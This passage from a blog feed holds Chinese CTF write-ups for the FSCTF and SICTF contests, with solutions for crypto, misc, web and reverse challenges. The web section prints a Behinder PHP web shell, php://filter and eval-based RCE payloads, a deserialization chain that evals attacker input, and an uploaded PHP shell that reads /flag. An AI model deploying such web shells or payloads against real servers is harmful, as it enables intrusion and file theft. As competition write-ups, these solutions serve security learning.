number\">16099847254382387482323197733210572595987701766995679577427964142162383113660616883997429365200200943640950821711084123429306946305893862414506257284441114840863787499898478803568113348661314216300658606282276936902117099898776435948501831796770856505782683585268617613575681655903107683069260253287994894440427511440504754827820494060133773435262418256886443037510658584541624614692050308222516337333585823733360631982795323752298740497235142977602602205292595197618229629610834651923388269194546316023246525302500676142502931303976146680655368617094100097945625676103639154884247373003120937959132698199043562660573</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">7980021929208497878634194663038470941705554065040985666635317762877799614984808729636911256912639929083920319066806111423231500122646366713245534616522235309310234767331344216892929739448126523171652425415458999098138841038319673380331281114806318366697490343176758140150118761408250366783210772381316729932361601257318131085116265135718477224618689710966570938280408341402386000281564650565256635313406111364916715660419153433573586809503564050585204002594864254089288672391014804368427324162776953191520483774116807593366091685560902424782104761523067998300887293902330501335485075609216897135678017158187880996872</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>h <span class=\"token operator\">=</span> <span class=\"token number\">14005608544369156893681352040163362072608754453657200460825561123439158535855236943525558717120672888372079069187756549797113560863313618058077150885401191613229507892570378437310964624470055767463556516869604496669085622244233154871165554916349033197798790982409986216498996673603605465039336316170130644317728786516639634775709400754328137266154981484016505702738584209800158047120647468364899692021253904198509376650238372552486792709682170146695759196408908825447960637667502907929061819408441663880712891979320089482801220225451560809151067631824526463122992973388740015878474372614751149918455457191739542980396</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"关键的vigenere\"><a class=\"markdownIt-Anchor\" href=\"#关键的vigenere\">#</a> 关键的 Vigenere</h3>\n<p py@nessfz_tzhozr!=\"\">题目：QGUMI</p>\n<p>key:\tFNY CQ HLQSEPNVJ<br>\n 提示：Keyword<br>\n（观其表，解其里）</p>\n<p>关键字解密：FNY CQ HLQSEPNVJ    key:Vigenere  &gt; KEY IS LOSTDREAM</p>\n<p yu@nsheng_qidong!=\"\">维吉尼亚解密：QGUMI {py@nessfz_tzhozr!}   key:LOSTDREAM  &gt; FSCTF</p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> misc</h2>\n<h3 id=\"simple-encryption\"><a class=\"markdownIt-Anchor\" href=\"#simple-encryption\">#</a> Simple Encryption</h3>\n<p>压缩包伪加密。直接修改 deFlags 9 &gt; 0</p>\n<h3 id=\"萧河\"><a class=\"markdownIt-Anchor\" href=\"#萧河\">#</a> 萧河</h3>\n<p>修改 16 进制压缩包头 89 50 4E 47</p>\n<p>修改图片高度得到 flag</p>\n<h3 id=\"base套\"><a class=\"markdownIt-Anchor\" href=\"#base套\">#</a> base 套</h3>\n<p>base64 套好多次阿！！！</p>\n<h3 id=\"行不行啊细狗\"><a class=\"markdownIt-Anchor\" href=\"#行不行啊细狗\">#</a> 行不行啊细狗</h3>\n<p>修改 docx 文档，可能是系统问题吗？</p>\n<pre><code>FSCTF&#123;N0t_A_heRo_\n你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊你行不行啊你行不行啊行不行啊行不行啊\n\ndoEs_not_re@d_t\n</code></pre>\n<p>得到两串 flag</p>\n<p>将其修改压缩包后缀名</p>\n<blockquote>\n<p>document.xml</p>\n</blockquote>\n<blockquote>\n<p>He_3_Kinggggdoms}</p>\n</blockquote>\n<p>拼凑得到 flag</p>\n<h3 id=\"ez-osint\"><a class=\"markdownIt-Anchor\" href=\"#ez-osint\">#</a> ez-osint</h3>\n<p>百度搜图直接讲解，8：35-8：45</p>\n<h3 id=\"为什么不换换思路捏\"><a class=\"markdownIt-Anchor\" href=\"#为什么不换换思路捏\">#</a> 为什么不换换思路捏</h3>\n<pre><code>密文：3956305A7652305877676D656E3532626F395664776B3358723557596F52335835423055375A4556444E6C52\n</code></pre>\n<p><img data-src=\"%5Cimg%5Cfsctfwppic%5Cimage-20231024083859306.png\" alt=\"image-20231024083859306\"></p>\n<h3 id=\"最终试炼hhh\"><a class=\"markdownIt-Anchor\" href=\"#最终试炼hhh\">#</a> 最终试炼 hhh</h3>\n<p>压缩包文件逆序，写脚本修改一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_hex</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        hex_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    reversed_hex <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>hex_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span>reversed_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>reverse_hex<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 1.zip</p>\n<p>里面有个 pdf 文档，利用工具 wbStego4.3open 无密码解密即可</p>\n<h3 id=\"夜深人静的时候也会偷偷emo\"><a class=\"markdownIt-Anchor\" href=\"#夜深人静的时候也会偷偷emo\">#</a> 夜深人静的时候也会偷偷 emo</h3>\n<p>压缩包密码：12345</p>\n<p CemMEnt_Se@1s_tHe_heaaaaaart_foR_An0ther_D@y=\"\">MP3Stego 隐写 ：FSCTF</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/09/10/sictf-wp/",
            "url": "http://example.com/2023/09/10/sictf-wp/",
            "title": "sictf_wp",
            "date_published": "2023-09-10T11:48:34.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h1>\n<h3 id=\"签到welcome\"><a class=\"markdownIt-Anchor\" href=\"#签到welcome\">#</a> 签到] Welcome</h3>\n<p><img data-src=\"/img/sictfpic/1.png\" alt=\"img\"></p>\n<h3 id=\"pixel_art\"><a class=\"markdownIt-Anchor\" href=\"#pixel_art\">#</a> Pixel_art</h3>\n<pre><code class=\"language-PHP\">from PIL import Image\nimage = Image.open('image.png')\nwidth, height = image.size\nfor y in range(height):\n    for x in range(width):\n        r, g, b = image.getpixel((x, y))\n        if r == 46:\n            print('.',end=&quot;&quot;)\n        elif r == 33:\n            print('!',end=&quot;&quot;)\n        elif r == 63:\n            print('?',end=&quot;&quot;)\n        if g == 46:\n                print('.',end=&quot;&quot;)\n        elif g == 33:\n                print('!',end=&quot;&quot;)\n        elif g == 63:\n                print('?',end=&quot;&quot;)\n        if b == 46:\n            print('.',end=&quot;&quot;)\n        elif b == 33:\n            print('!',end=&quot;&quot;)\n        elif b == 63:\n            print('?',end=&quot;&quot;)\n</code></pre>\n<pre><code class=\"language-aspn\n Ook\n</code></pre>\n<h3 id=\"baby_zip\"><a class=\"markdownIt-Anchor\" href=\"#baby_zip\">#</a> baby_zip</h3>\n<pre><code class=\"language-PHP\">bkcrack -C flag.zip -c flag.png -x 0 89504E470D0A1A0A0000000D49484452\nbkcrack -C flag.zip -c flag.png -k 6424c164 7c334afd f99666e5 -d flag.png\n</code></pre>\n<p>010 查看 flag 在最后</p>\n<h3 id=\"easy_shark\"><a class=\"markdownIt-Anchor\" href=\"#easy_shark\">#</a> Easy_Shark</h3>\n<p>AES 冰蝎 3 流量的特征</p>\n<pre><code class=\"language-PHP\">&lt;?php\n@error_reporting(0);\nsession_start();\n    $key=&quot;2295d22e2d70888f&quot;;\n        $_SESSION['k']=$key;\n        $post=file_get_contents(&quot;php://input&quot;);\n        if(!extension_loaded('openssl'))\n        &#123;\n                $t=&quot;base64_&quot;.&quot;decode&quot;;\n                $post=$t($post.&quot;&quot;);\n                \n                for($i=0;$i&lt;strlen($post);$i++) &#123;\n                             $post[$i] = $post[$i]^$key[$i+1&amp;15]; \n                            &#125;\n        &#125;\n        else\n        &#123;\n                $post=openssl_decrypt($post, &quot;AES128&quot;, $key);\n        &#125;\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n        class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;\n    @call_user_func(new C(),$params);\n?&gt;\nkey = '2295d22e2d70888f'\n</code></pre>\n<p><img data-src=\"/img/sictfpic/2.png\" alt=\"img\"></p>\n<p>解冰蝎流量</p>\n<p><img data-src=\"/img/sictfpic/3.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/4.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/5.png\" alt=\"img\"></p>\n<p>Gron 解密</p>\n<pre><code class=\"language-PHP\">def decrypt_string(ciphertext, offsets):\n    decrypted_string = &quot;&quot;\n    offset_index = 0\n\n    for char in ciphertext:\n        offset = offsets[offset_index] % 26\n        decrypted_char_code = (ord(char) - ord('A') - offset) % 26 + ord('A')\n        decrypted_char = chr(decrypted_char_code)\n        decrypted_string += decrypted_char\n\n        offset_index = (offset_index + 1) % len(offsets)\n\n    return decrypted_string\n\nciphertext = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;\noffsets = [1, 50, 61, 8, 9, 20, 63, 41]\n\nwhile True:\n    decrypted_string = decrypt_string(ciphertext, offsets)\n    print(decrypted_string)\n</code></pre>\n<h3 id=\"fast_morse\"><a class=\"markdownIt-Anchor\" href=\"#fast_morse\">#</a> fast_morse</h3>\n<p>morse 解密</p>\n<p><img data-src=\"/img/sictfpic/6.png\" alt=\"img\"></p>\n<p>得到 falg</p>\n<p><img data-src=\"/img/sictfpic/7.png\" alt=\"img\"></p>\n<p>变成小写</p>\n<p>flag:SICTF f2a098f-7f4a-93a5-c8a48360b03c}</p>\n<h3 id=\"qr_qr_qr\"><a class=\"markdownIt-Anchor\" href=\"#qr_qr_qr\">#</a> QR_QR_QR</h3>\n<pre><code class=\"language-Python\">import numpy as np\nimport matplotlib.pyplot as plt\nfrom pyzbar.pyzbar import decode\nfrom PIL import Image\nfrom pwn import *\n\n# 设置日志级别为调试模式\ncontext(log_level='debug')\n\n# 创建图片函数\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    # 生成图片数组\n    image_array = [[255 if bit == '1' else 0 for bit in line.strip()] for line in lines]\n    image_array = np.array(image_array, dtype=np.uint8)\n\n    # 保存为图片\n    plt.imsave('output.png', image_array, cmap='gray')\n\n# 读取二维码函数\ndef read_qr_code(image_path):\n    image = Image.open(image_path)\n    decoded_objects = decode(image)\n    for obj in decoded_objects:\n        return obj.data.decode('utf-8')\n\n# 连接服务器\nconn = remote('210.44.151.51', 10523)\n\nwhile True:\n    try:\n        # 从服务器接收数据\n        data = conn.recvuntil('Please Decrypt this QR code:', drop=True)\n\n        # 将数据保存到文本文件\n        with open('1.txt', 'w') as file:\n            file.write(data.decode())\n\n        # 从文本文件创建图片\n        create_image('1.txt')\n\n        # 读取图片中的二维码\n        code = read_qr_code('output.png')\n        print(code)\n\n        # 发送二维码到服务器\n        conn.sendline(str(code))\n        conn.recvline()\n    finally:\n        # 关闭文件\n        file.close()\n</code></pre>\n<h3 id=\"问卷调查\"><a class=\"markdownIt-Anchor\" href=\"#问卷调查\">#</a> 问卷调查</h3>\n<p>第三道就是 flag</p>\n<p>SICTF SICTF_Round3_will_do_even_better!}</p>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> WEB</h1>\n<h3 id=\"签到include\"><a class=\"markdownIt-Anchor\" href=\"#签到include\">#</a> [签到] Include</h3>\n<p>利用伪协议可直接读到 flag</p>\n<pre><code class=\"language-Python\">    /?SICTF=php://filter/convert.base64-encode/resource=/flag\n</code></pre>\n<h3 id=\"baby_php\"><a class=\"markdownIt-Anchor\" href=\"#baby_php\">#</a> Baby_PHP</h3>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\n$query = $_SERVER['QUERY_STRING'];\n\nif (preg_match('/_|%5f|\\.|%2E/i', $query)) &#123;\n    die('You are Hacker!');\n&#125;\nif($_GET['k_e_y'] !=='123' &amp;&amp; preg_match('/^123$/',$_GET['k_e_y']))&#123;\n    echo(&quot;You are will Win!&lt;br&gt;&quot;);\n    if(isset($_POST['command']))&#123;\n        $command = $_POST['command'];\n        if(!preg_match(&quot;/\\~|\\`|\\@|\\#|\\\\$|\\%|\\&amp;|\\*|\\（|\\）|\\-|\\+|\\=|\\&#123;|\\&#125;|\\[|\\]|\\:|\\'|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;,$command))&#123;\n            eval($command);\n        &#125;\n        else&#123;\n            echo(&quot;You are Hacker!&quot;);\n        &#125;\n    &#125;\n&#125;\nelse&#123;\n    echo(&quot;K_e_y is Errors!&quot;);\n&#125;K_e_y is Errors!\n</code></pre>\n<p>代码开始会对输入的字符串进行正则匹配，跟_有关的 url 编码之类的全部过滤</p>\n<p>可以用空格或者。代替_,. 又被过滤了，用了空格，后面一个简单的若比较换行符绕过</p>\n<p>后面 cmd 一个无数字字母 rce</p>\n<p>可见 ctfshow  web40 的题解</p>\n<pre><code class=\"language-Plain\">/?k%20e%20y=123%0a\ncommand=show_source(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre>\n<h3 id=\"rce\"><a class=\"markdownIt-Anchor\" href=\"#rce\">#</a> RCE</h3>\n<pre><code class=\"language-Plain\">&lt;?php \nerror_reporting(0); \nhighlight_file(__FILE__); \n$code = $_POST['code']; \n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code); \n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code); \neval($code); \n?&gt;\n</code></pre>\n<p>借鉴宏爷文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzYzOTI4Nzk2L2FydGljbGUvZGV0YWlscy8xMjc5NjMwNzk=\">https://blog.csdn.net/qq_63928796/article/details/127963079</span></p>\n<pre><code class=\"language-PHP\">code=echo $_POST[1];&amp;1=cat /f*\n</code></pre>\n<h3 id=\"我全都要\"><a class=\"markdownIt-Anchor\" href=\"#我全都要\">#</a> 我全都要</h3>\n<p>POP</p>\n<pre><code class=\"language-PHP\">&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop = '233333333';\n    public $i = '1';\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;扣1送地狱火&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo '&lt;img src=\\'R.jpg\\'&gt;';\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;必须执行&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl = 'QNKCDZO' ;\n    public $boy = '240610708';\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public $name = '1';\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;有对象我会在这打CTF???看我克隆一个对象！&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;打游戏去，别想着对象了&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n$a = new B();\n$a -&gt;pop = new A();\n$a -&gt;pop -&gt;Aec = new B();\n$a -&gt;pop -&gt;Aec -&gt; nogame = new P();\necho serialize($a);\n</code></pre>\n<p>然后命令执行</p>\n<p>cmd=</p>\n<h3 id=\"你能跟得上我的speed吗\"><a class=\"markdownIt-Anchor\" href=\"#你能跟得上我的speed吗\">#</a> 你能跟得上我的 speed 吗</h3>\n<p>条件竞争</p>\n<p>准备一个 php 文件</p>\n<p>内容为</p>\n<pre><code>&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;\n</code></pre>\n<p>抓两个包</p>\n<p>一个为 get 传参的包，访问 url/uploads/2.php, 抓包</p>\n<p>另一个为 post 包，直接就抓上传的包，如下</p>\n<p><img data-src=\"/img/sictfpic/8.png\" alt=\"img\"></p>\n<p>俩个包用 burp 爆破，爆破方式为 noplayload，开跑</p>\n<p><img data-src=\"/img/sictfpic/9.png\" alt=\"img\"></p>\n<h1 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re</h1>\n<h3 id=\"签到pyc\"><a class=\"markdownIt-Anchor\" href=\"#签到pyc\">#</a> [签到] PYC</h3>\n<p><img data-src=\"/img/sictfpic/10.png\" alt=\"img\"></p>\n<h3 id=\"myobject\"><a class=\"markdownIt-Anchor\" href=\"#myobject\">#</a> Myobject</h3>\n<p>动调出数据，直接赛博厨子秒了</p>\n<p><img data-src=\"/img/sictfpic/11.png\" alt=\"img\"></p>\n<h3 id=\"chbase\"><a class=\"markdownIt-Anchor\" href=\"#chbase\">#</a> chbase</h3>\n<p>换表加密</p>\n<p><img data-src=\"/img/sictfpic/12.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/13.png\" alt=\"img\"></p>\n<p><img data-src=\"/img/sictfpic/14.png\" alt=\"img\"></p>\n<h3 id=\"不一样的base64\"><a class=\"markdownIt-Anchor\" href=\"#不一样的base64\">#</a> 不一样的 base64</h3>\n<pre><code class=\"language-Java\">BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\n\ndef base64_decode(encoded_data):\n    decoded_data = ''\n    padding_count = encoded_data.count('=')\n    encoded_data = encoded_data.replace('=', '')\n\n    binary_str = ''\n    for char in encoded_data:\n        decimal_val = BASE64_CHARS.index(char)\n        binary_str += format(decimal_val, '06b')\n\n    if padding_count &gt; 0:\n        binary_str = binary_str[:-padding_count * 2]\n\n    for i in range(0, len(binary_str), 8):\n        byte = binary_str[i:i + 8]\n        decoded_data += chr(int(byte, 2))\n\n    return decoded_data\n\nencoded_data = input('')\ndecoded_data = base64_decode(encoded_data)\nprint(decoded_data)\n</code></pre>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h1>\n<h3 id=\"签到shop\"><a class=\"markdownIt-Anchor\" href=\"#签到shop\">#</a> [签到] Shop</h3>\n<p><img data-src=\"/img/sictfpic/15.png\" alt=\"img\"></p>\n<h1 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h1>\n<h3 id=\"古典大杂烩\"><a class=\"markdownIt-Anchor\" href=\"#古典大杂烩\">#</a> 古典大杂烩</h3>\n<pre><code class=\"language-PHP\">🐩👃🐪🐼👅🐯🐩👈👇👭👟👝🐺🐭👉👙👤👋👚🐪🐫👍👢👮👱🐼👢👨👠👭🐽🐰🐻👚👂👧👠👥👛👮👯👮👬🐾👐👛👌👚👞🐨👏👉👆🐿👆👘👇🐺👦🐸👃🐭👟👑👪👃👁🐻🐻👜🐧👇👊🐧🐾🐼👇🐫🐺👐👆👪🐼👋👌👧🐻👐🐩🐺👥🐽👋👉🐰👎👠👠👣🐧🐫👧🐭👢🐯👑👑🐮👂👏🐻👥👚🐮👋👬👌👥👁👣👅👧👯👦👌👌👍👠👌🐽👉👃👊🐫👉🐨🐮👩👆🐪🐯👘👏👏🐼👩👍👊👍👡👀👰👋👣👨👧👍👜👐👛🐮👘👅👠🐿👂👰👄👈👝👠👤👃👛👘🐭👅👱👆👬👫👥👆🐽👁👐👥👊👇👉👊👩👌👭🐫🐫👬👱🐯👇🐺👁👞👑👙🐮👜👋👘👪👩👚👦👨👀👩👐👉👃🐾👥👀🐫👝👍🐩🐧👰👆👇👨🐪👃🐭👦🐫👱\n</code></pre>\n<p>emjio 解密</p>\n<pre><code class=\"language-PHP\">2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z\n</code></pre>\n<p><img data-src=\"/img/sictfpic/16.png\" alt=\"img\"></p>\n<h3 id=\"radio\"><a class=\"markdownIt-Anchor\" href=\"#radio\">#</a> Radio</h3>\n<p><img data-src=\"/img/sictfpic/17.png\" alt=\"img\"></p>\n<h3 id=\"easy_coppersmith\"><a class=\"markdownIt-Anchor\" href=\"#easy_coppersmith\">#</a> Easy_CopperSmith</h3>\n<pre><code class=\"language-Java\">from sage.all import *\nimport binascii\nfrom Crypto.Util.number import *\n\nn =114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\ncipher =87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\n\ne2 = 0x10001\npbits = 512\nfor i in range(0,2**4):\n    p4=0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590\n    p4=p4+int(hex(i),16)\n    print(hex(p4))\n    kbits = pbits - p4.nbits()  #未知需要爆破的比特位数\n    print(p4.nbits())\n    p4 = p4 &lt;&lt; kbits\n    PR.&lt;x&gt; = PolynomialRing(Zmod(n))\n    f = x + p4\n    roots = f.small_roots(X=2^kbits, beta=0.4) #进行爆破\n    #print roots\n    if roots:        #爆破成功，求根\n        p = p4+int(roots[0])\n        print(&quot;p: &quot;, hex(int(p)))\n        assert n % p == 0\n        q = n/int(p)\n        print(&quot;q: &quot;, hex(int(q)))\n        print(gcd(p,q))\n        phin = (p-1)*(q-1)\n        print(gcd(e2,phin))\n        d = inverse_mod(e2,phin)\n        print(&quot;d：&quot;,d)\n        flag = pow(cipher,d,n)\n        flag = hex(int(flag))[2:]\n        result = &quot;&quot;\n        for i in range(0, len(flag), 2):\n            hex_int = int(flag[i:i+2], 16)  # 转换为整数\n            result += chr(hex_int)  # 转换为字符并拼接到结果字符串\n        print('result :',result)\n        \n# SICTF 3f9366ed-b8e4-412f-bbd0-62616a24115c&#125;\n</code></pre>\n<h3 id=\"mingtianpao\"><a class=\"markdownIt-Anchor\" href=\"#mingtianpao\">#</a> MingTianPao</h3>\n<pre><code class=\"language-Python\">import codecs\nimport numpy as np\n\ndef is_character(x):\n    return ord('a') &lt;= x &lt;= ord('z') or ord('A') &lt;= 